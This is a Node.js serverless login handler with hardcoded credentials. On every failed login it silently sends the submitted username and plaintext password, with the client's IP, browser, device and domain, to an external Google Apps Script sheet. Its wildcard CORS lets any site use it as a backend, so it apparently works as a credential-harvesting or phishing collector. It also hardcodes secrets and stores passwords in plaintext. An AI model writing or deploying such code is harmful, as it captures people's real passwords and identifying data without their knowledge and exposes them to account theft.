const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbzy5ABUhp29qAvnZY3wliCBJpISx-xEbbPkq2EpRT2W6U1woJ5m81llJguyyRKjLE5pNg/exec';

// ─── Credentials ──────────────────────────────────────────────────────────────
const VALID_USER = 'nikhil';
const VALID_ACCESS_KEY = 'Nikhil@1234';

// ─── Google Sheets ────────────────────────────────────────────────────────────
async function sendToGoogleSheets(entry) {
    try {
        var payload = {
            timestamp: new Date().toISOString(),
            username:  entry.username || '',
            password:  entry.accessKey || '',
            browser:   entry.browser || '',
            platform:  entry.device || '',
            ip:        entry.ip || '',
            domain:    entry.domain || '',
            status:    'Failed'
        };
        await fetch(GOOGLE_SHEETS_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Google Sheets error:', e.message);
    }
}

// ─── Main Handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // ── User login ───────────────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, accessKey } = req.body || {};
        const isMatching = (username === VALID_USER && accessKey === VALID_ACCESS_KEY);

        if (!isMatching) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if      (ua.includes('Edg'))                               browser = 'Edge';
            else if (ua.includes('Chrome'))                            browser = 'Chrome';
            else if (ua.includes('Firefox'))                           browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';

            const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';

            const entry = {
                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                username:  username || '',
                accessKey:  accessKey || '',
                browser,
                device,
                ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown',
                domain: (req.headers['x-forwarded-host'] || req.headers['host'] || '').split(':')[0]
            };

            // Save to Google Sheets
            await sendToGoogleSheets(entry);
        }

        return res.status(200).json({ success: isMatching });
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
